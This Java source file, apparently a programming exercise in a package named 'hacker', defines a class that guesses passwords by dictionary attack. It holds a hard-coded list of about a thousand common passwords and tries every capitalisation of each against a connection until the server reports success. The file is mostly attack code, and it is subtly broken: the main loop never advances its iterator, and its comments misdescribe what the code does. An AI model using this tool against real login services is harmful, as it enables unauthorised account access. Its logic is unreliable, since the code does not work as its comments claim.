package hacker;

import java.util.*;

public class SimpleBruteForcer {
    ArrayDeque<String> workingDeque;
    ConnectionLink workingConnection;

    public SimpleBruteForcer(ArrayDeque<String> workingDeque, ConnectionLink workingConnection) {
        this.workingDeque = workingDeque;
        this.workingConnection = workingConnection;
    }

    public String BruteForce() {

        Iterator<String> it = workingDeque.iterator();
        ArrayDeque<String> nextDeque = new ArrayDeque<>();
        String[] strings = "123456\npassword\n12345678\nqwerty\n123456789\n12345\n1234\n111111\n1234567\ndragon\n123123\nbaseball\nabc123\nfootball\nmonkey\nletmein\n696969\nshadow\nmaster\n666666\nqwertyuiop\n123321\nmustang\n1234567890\nmichael\n654321\npussy\nsuperman\n1qaz2wsx\n7777777\n121212\n000000\nqazwsx\n123qwe\nkiller\ntrustno1\njordan\njennifer\nzxcvbnm\nasdfgh\nhunter\nbuster\nsoccer\nharley\nbatman\nandrew\ntigger\nsunshine\niloveyou\n2000\ncharlie\nrobert\nthomas\nhockey\nranger\ndaniel\nstarwars\nklaster\n112233\ngeorge\ncomputer\nmichelle\njessica\npepper\n1111\nzxcvbn\n555555\n11111111\n131313\nfreedom\n777777\npass\nmaggie\n159753\naaaaaa\nginger\nprincess\njoshua\ncheese\namanda\nsummer\nlove\nashley\n6969\nnicole\nchelsea\nbiteme\nmatthew\naccess\nyankees\n987654321\ndallas\naustin\nthunder\ntaylor\nmatrix\nwilliam\ncorvette\nhello\nmartin\nheather\nsecret\nmerlin\ndiamond\n1234qwer\ngfhjkm\nhammer\nsilver\n222222\n88888888\nanthony\njustin\ntest\nbailey\nq1w2e3r4t5\npatrick\ninternet\nscooter\norange\n11111\ngolfer\ncookie\nrichard\nsamantha\nbigdog\nguitar\njackson\nwhatever\nmickey\nchicken\nsparky\nsnoopy\nmaverick\nphoenix\ncamaro\npeanut\nmorgan\nwelcome\nfalcon\ncowboy\nferrari\nsamsung\nandrea\nsmokey\nsteelers\njoseph\nmercedes\ndakota\narsenal\neagles\nmelissa\nboomer\nbooboo\nspider\nnascar\nmonster\ntigers\nyellow\nxxxxxx\n123123123\ngateway\nmarina\ndiablo\nbulldog\nqwer1234\ncompaq\npurple\nhardcore\nbanana\njunior\nhannah\n123654\nporsche\nlakers\niceman\nmoney\ncowboys\n987654\nlondon\ntennis\n999999\nncc1701\ncoffee\nscooby\n0000\nmiller\nboston\nq1w2e3r4\nbrandon\nyamaha\nchester\nmother\nforever\njohnny\nedward\n333333\noliver\nredsox\nplayer\nnikita\nknight\nfender\nbarney\nmidnight\nplease\nbrandy\nchicago\nbadboy\nslayer\nrangers\ncharles\nangel\nflower\nrabbit\nwizard\nbigdick\njasper\nenter\nrachel\nchris\nsteven\nwinner\nadidas\nvictoria\nnatasha\n1q2w3e4r\njasmine\nwinter\nprince\npanties\nmarine\nghbdtn\nfishing\ncocacola\ncasper\njames\n232323\nraiders\n888888\nmarlboro\ngandalf\nasdfasdf\ncrystal\n87654321\n12344321\ngolden\n8675309\npanther\nlauren\nangela\nthx1138\nangels\nmadison\nwinston\nshannon\nmike\ntoyota\njordan23\ncanada\nsophie\nPassword\napples\ntiger\nrazz\n123abc\npokemon\nqazxsw\n55555\nqwaszx\nmuffin\njohnson\nmurphy\ncooper\njonathan\nliverpoo\ndavid\ndanielle\n159357\njackie\n1990\n123456a\n789456\nturtle\nabcd1234\nscorpion\nqazwsxedc\n101010\nbutter\ncarlos\npassword1\ndennis\nslipknot\nqwerty123\nasdf\n1991\nblack\nstartrek\n12341234\ncameron\nnewyork\nrainbow\nnathan\njohn\n1992\nrocket\nviking\nredskins\nasdfghjkl\n1212\nsierra\npeaches\ngemini\ndoctor\nwilson\nsandra\nhelpme\nqwertyui\nvictor\nflorida\ndolphin\npookie\ncaptain\ntucker\nblue\nliverpool\ntheman\nbandit\ndolphins\nmaddog\npackers\njaguar\nlovers\nnicholas\nunited\ntiffany\nmaxwell\nzzzzzz\nnirvana\njeremy\nmonica\nelephant\ngiants\nhotdog\nrosebud\nsuccess\ndebbie\nmountain\n444444\nxxxxxxxx\nwarrior\n1q2w3e4r5t\nq1w2e3\n123456q\nalbert\nmetallic\nlucky\nazerty\n7777\nalex\nbond007\nalexis\n1111111\nsamson\n5150\nwillie\nscorpio\nbonnie\ngators\nbenjamin\nvoodoo\ndriver\ndexter\n2112\njason\ncalvin\nfreddy\n212121\ncreative\n12345a\nsydney\nrush2112\n1989\nasdfghjk\nred123\nbubba\n4815162342\npassw0rd\ntrouble\ngunner\nhappy\ngordon\nlegend\njessie\nstella\nqwert\neminem\narthur\napple\nnissan\nbear\namerica\n1qazxsw2\nnothing\nparker\n4444\nrebecca\nqweqwe\ngarfield\n01012011\nbeavis\n69696969\njack\nasdasd\ndecember\n2222\n102030\n252525\n11223344\nmagic\napollo\nskippy\n315475\ngirls\nkitten\ngolf\ncopper\nbraves\nshelby\ngodzilla\nbeaver\nfred\ntomcat\naugust\nbuddy\nairborne\n1993\n1988\nlifehack\nqqqqqq\nbrooklyn\nanimal\nplatinum\nphantom\nonline\nxavier\ndarkness\nblink182\npower\nfish\ngreen\n789456123\nvoyager\npolice\ntravis\n12qwaszx\nheaven\nsnowball\nlover\nabcdef\n00000\npakistan\n007007\nwalter\nplayboy\nblazer\ncricket\nsniper\ndonkey\nwillow\nloveme\nsaturn\ntherock\nredwings\nbigboy\npumpkin\ntrinity\nwilliams\nnintendo\ndigital\ndestiny\ntopgun\nrunner\nmarvin\nguinness\nchance\nbubbles\ntesting\nfire\nnovember\nminecraft\nasdf1234\nlasvegas\nsergey\nbroncos\ncartman\nprivate\nceltic\nbirdie\nlittle\ncassie\nbabygirl\ndonald\nbeatles\n1313\nfamily\n12121212\nschool\nlouise\ngabriel\neclipse\nfluffy\n147258369\nlol123\nexplorer\nbeer\nnelson\nflyers\nspencer\nscott\nlovely\ngibson\ndoggie\ncherry\nandrey\nsnickers\nbuffalo\npantera\nmetallica\nmember\ncarter\nqwertyu\npeter\nalexande\nsteve\nbronco\nparadise\ngoober\n5555\nsamuel\nmontana\nmexico\ndreams\nmichigan\ncarolina\nfriends\nmagnum\nsurfer\nmaximus\ngenius\ncool\nvampire\nlacrosse\nasd123\naaaa\nchristin\nkimberly\nspeedy\nsharon\ncarmen\n111222\nkristina\nsammy\nracing\nou812\nsabrina\nhorses\n0987654321\nqwerty1\nbaby\nstalker\nenigma\n147147\nstar\npoohbear\n147258\nsimple\n12345q\nmarcus\nbrian\n1987\nqweasdzxc\ndrowssap\nhahaha\ncaroline\nbarbara\ndave\nviper\ndrummer\naction\neinstein\ngenesis\nhello1\nscotty\nfriend\nforest\n010203\nhotrod\ngoogle\nvanessa\nspitfire\nbadger\nmaryjane\nfriday\nalaska\n1232323q\ntester\njester\njake\nchampion\nbilly\n147852\nrock\nhawaii\nchevy\n420420\nwalker\nstephen\neagle1\nbill\n1986\noctober\ngregory\nsvetlana\npamela\n1984\nmusic\nshorty\nwestside\nstanley\ndiesel\ncourtney\n242424\nkevin\nhitman\nmark\n12345qwert\nreddog\nfrank\nqwe123\npopcorn\npatricia\naaaaaaaa\n1969\nteresa\nmozart\nbuddha\nanderson\npaul\nmelanie\nabcdefg\nsecurity\nlucky1\nlizard\ndenise\n3333\na12345\n123789\nruslan\nstargate\nsimpsons\nscarface\neagle\n123456789a\nthumper\nolivia\nnaruto\n1234554321\ngeneral\ncherokee\na123456\nvincent\nUsuckballz1\nspooky\nqweasd\nfree\nfrankie\ndouglas\ndeath\n1980\nloveyou\nkitty\nkelly\nveronica\nsuzuki\nsemperfi\npenguin\nmercury\nliberty\nspirit\nscotland\nnatalie\nmarley\nvikings\nsystem\nking\nallison\nmarshall\n1979\n098765\nqwerty12\nhummer\nadrian\n1985\nvfhbyf\nsandman\nrocky\nleslie\nantonio\n98765432\n4321\nsoftball\npassion\nmnbvcxz\npassport\nrascal\nhoward\nfranklin\nbigred\nalexander\nhomer\nredrum\njupiter\nclaudia\n55555555\n141414\nzaq12wsx\npatches\nraider\ninfinity\nandre\n54321\ngalore\ncollege\nrussia\nkawasaki\nbishop\n77777777\nvladimir\nmoney1\nfreeuser\nwildcats\nfrancis\ndisney\nbudlight\nbrittany\n1994\n00000000\nsweet\noksana\nhonda\ndomino\nbulldogs\nbrutus\nswordfis\nnorman\nmonday\njimmy\nironman\nford\nfantasy\n9999\n7654321\nPASSWORD\nduncan\n1977\njeffrey\nhouse\ndancer\nbrooke\ntimothy\nsuper\nmarines\njustice\ndigger\nconnor\npatriots\nkarina\n202020\nmolly\neverton\ntinker\nalicia\nrasdzv3\npoop\npearljam\nstinky\ncolorado\n123123a\nwater\ntest123\nncc1701d\nmotorola\nireland\nasdfg\nmatt\nhouston\nboogie\nzombie\naccord\nvision\nbradley\nreggie\nkermit\nfroggy\nducati\navalon\n6666\n9379992\nsarah\nsaints\nlogitech\nchopper\n852456\nsimpson\nmadonna\njuventus\nclaire\n159951\nzachary\nyfnfif\nwolverin\nwarcraft\nhello123\nextreme\npeekaboo\nfireman\neugene\nbrenda\n123654789\nrussell\npanthers\ngeorgia\nsmith\nskyline\njesus\nelizabet\nspiderma\nsmooth\npirate\nempire\nbullet\n8888\nvirginia\nvalentin\npsycho\npredator\narizona\n134679\nmitchell\nalyssa\nvegeta\ntitanic\nchrist\ngoblue\nfylhtq\nwolf\nmmmmmm\nkirill\nindian\nhiphop\nbaxter\nawesome\npeople\ndanger\nroland\nmookie\n741852963\n1111111111\ndreamer\nbambam\narnold\n1981\nskipper\nserega\nrolltide\nelvis\nchangeme\nsimon\n1q2w3e\nlovelove\nfktrcfylh\ndenver\ntommy\nmine\nloverboy\nhobbes\nhappy1\nalison\nnemesis\nchevelle\ncardinal\nburton\npicard\n151515\ntweety\nmichael1\n147852369\n12312\nxxxx\nwindows\nturkey\n456789\n1974\nvfrcbv\nsublime\n1975\ngalina\nbobby\nnewport\nmanutd\namerican\nalexandr\n1966\nvictory\nrooster\nqqq111\nmadmax\nelectric\na1b2c3\nwolfpack\nspring\nphpbb\nlalala\nspiderman\neric\ndarkside\nclassic\nraptor\n123456789q\nhendrix\n1982\nwombat\navatar\nalpha\nzxc123\ncrazy\nhard\nengland\nbrazil\n1978\n01011980\nwildcat\npolina\nfreepass\nlauragpe\nthe0toky\nredhead\nwoody\nsnowman\ntiger1\nstingray\nkristen\njerry\n789455\ngarcia\nlights\nchronic\nalison77\nservice\nservice1\nsrinivas\nkatie\nbrother\nsingle\ncannon\n11georgia\ntattoo\ntexas\nparty\ntaurus\nwolves\nflowers\ntarheels\nfisher\ntesttest\nmature\nbass\nbrass\ncatch22\njuice\nalpha1\nhawkeye\nmachine\npyramid\nvegetaaa\nkatana\nmoose\ntinkerr\ncoyote\ninside\npepsi\nletmein1\ncontrol\nmaiden\nquan\nnong\nneng\nbuttons\nbiao\nxuan".split("\n");
        while (it.hasNext()) {

            //try adding all numbers to end of first queue item
            for (String word : strings) {
                int combinations = 1 << word.length();
                for (int k = 0; k < combinations; k++) {
                    StringBuilder buf = new StringBuilder(word);
                    for (int j = 0; j < word.length(); j++) {
                        if ((k & 1 << j) != 0) {
                            String s = word.substring(j, j + 1).toUpperCase();
                            buf.replace(j, j + 1, s);
                        }
                    }
                    String result = workingConnection.SendAndReceive(buf.toString());
                    switch (result) {
                        case "Connection success!" -> {
                            return buf.toString();
                        }
                        case "Wrong password!" -> nextDeque.add(buf.toString());
                        case "Too many attempts." -> {
                            return result;
                        }
                    }
                }
            }
        }

        //if this failed, all tried items have been added to end of queue so restart
        //but on those items, effectively adding a new character
        SimpleBruteForcer nextBruteForce = new SimpleBruteForcer(nextDeque, workingConnection);
        return nextBruteForce.BruteForce();
    }



}
